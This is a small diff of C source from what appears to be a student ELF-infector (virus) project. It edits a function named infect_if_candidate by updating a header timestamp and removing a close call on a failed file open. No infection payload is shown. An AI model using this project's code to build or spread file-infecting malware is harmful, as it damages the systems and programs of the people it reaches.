@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 04:50:05 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/07 10:36:15 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -43,7 +43,6 @@ inline bool	infect_if_candidate(const char *file)
 
 	if (fd < 0)
 	{
-		famine_close(fd);
 		return errors(ERR_SYS, "cannot open");
 	}
 	if (famine_read(fd, &elf64_hdr, sizeof(elf64_hdr)) < (ssize_t)sizeof(elf64_hdr))
